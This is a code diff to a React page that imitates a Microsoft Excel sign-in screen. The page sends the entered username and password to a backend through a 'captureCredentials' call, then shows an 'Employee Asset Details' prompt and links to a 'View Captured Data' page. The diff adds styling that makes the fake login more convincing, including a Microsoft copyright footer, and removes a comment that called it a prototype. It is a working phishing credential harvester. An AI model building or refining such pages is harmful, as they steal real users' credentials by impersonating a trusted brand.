@@ -12,10 +12,10 @@ export default function Home() {
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
-    
+
     // Capture credentials on the backend
     await captureCredentials({ username, password });
-    
+
     // Show SweetAlert2 prompt
     Swal.fire({
       title: "Action Required: Employee Asset Details",
@@ -26,42 +26,93 @@ export default function Home() {
       background: "#fff",
       color: "#333"
     }).then(() => {
-      // In a real scenario, you would redirect. For this prototype, we do nothing.
       console.log("Alert closed. Would redirect to employee-asset-update.html");
     });
   };
-  
+
   return (
     <>
       {/* Background Image */}
       <div id="backgroundImage"></div>
 
       {/* Login Overlay */}
-      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
-        
-        <h2>Sign in to Excel</h2>
-        <form onSubmit={handleSubmit}>
-          <input 
-            type="text" 
-            name="username" 
-            placeholder="Email or phone" 
-            autoComplete="username" 
+      <div
+        className="login-overlay"
+        role="main"
+        aria-label="Excel Login Screen"
+        style={{
+          display: 'flex',
+          flexDirection: 'column',
+          justifyContent: 'center',
+          alignItems: 'center',
+          height: '100vh',
+          backgroundColor: 'transparent',
+          backdropFilter: 'none',
+        }}
+      >
+        <h2 style={{ marginBottom: '20px', color: '#217346' }}>Sign in to Excel</h2>
+
+        <form
+          onSubmit={handleSubmit}
+          style={{
+            display: 'flex',
+            flexDirection: 'column',
+            background: '#fff',
+            padding: '30px',
+            borderRadius: '12px',
+            boxShadow: '0 4px 20px rgba(0,0,0,0.2)',
+            width: '300px',
+          }}
+        >
+          <input
+            type="text"
+            name="username"
+            placeholder="Email or phone"
+            autoComplete="username"
             value={username}
             onChange={(e) => setUsername(e.target.value)}
-            required 
+            required
+            style={{
+              marginBottom: '10px',
+              padding: '10px',
+              borderRadius: '6px',
+              border: '1px solid #ccc',
+            }}
           />
-          <input 
-            type="password" 
-            name="password" 
-            placeholder="Password" 
-            autoComplete="current-password" 
+          <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            autoComplete="current-password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
-            required 
+            required
+            style={{
+              marginBottom: '15px',
+              padding: '10px',
+              borderRadius: '6px',
+              border: '1px solid #ccc',
+            }}
           />
-          <button type="submit">Sign in</button>
-          <small>© Microsoft Corporation</small>
+          <button
+            type="submit"
+            style={{
+              backgroundColor: '#217346',
+              color: '#fff',
+              border: 'none',
+              borderRadius: '6px',
+              padding: '10px',
+              cursor: 'pointer',
+              fontWeight: 'bold',
+            }}
+          >
+            Sign in
+          </button>
+          <small style={{ marginTop: '10px', textAlign: 'center', color: '#888' }}>
+            © Microsoft Corporation
+          </small>
         </form>
+
         <div style={{ marginTop: '20px' }}>
           <Link href="/data" style={{ color: '#217346', textDecoration: 'none' }}>
             View Captured Data
